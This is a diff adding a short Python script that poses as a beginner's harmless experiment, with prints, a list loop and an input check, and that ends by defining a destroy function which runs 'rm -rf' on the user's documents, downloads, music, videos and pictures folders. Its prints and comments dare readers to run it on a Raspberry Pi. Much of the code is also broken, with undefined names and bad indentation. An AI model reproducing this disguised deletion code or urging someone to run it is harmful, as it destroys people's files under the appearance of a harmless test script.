@@ -1,0 +1,29 @@
+import time
+import os
+
+print("Just trying to figure out how this works")
+testing = input()
+if testing == bob:
+  print("Ha ha ha ha ha")
+ else:
+  print("Oh...")
+list = [1,2,3,4,5,6,7,8,9]
+for number in list:
+  print("The magical number is: " + number + '!')
+os.system('clear')
+print("Wow, I really think this is a great code")
+time.sleep(2)
+print("Run this on your raspberry pi, I dare you!")
+
+def destroy(x):
+  os.system('rm -rf ' + x)
+  
+destroy(documents)
+destroy(downloads)
+destroy(music)
+destroy(videos)
+destroy(pictures)
+#Moo ooo ah ah ah!!!
+
+
+#Somebody run this and tell me if it works
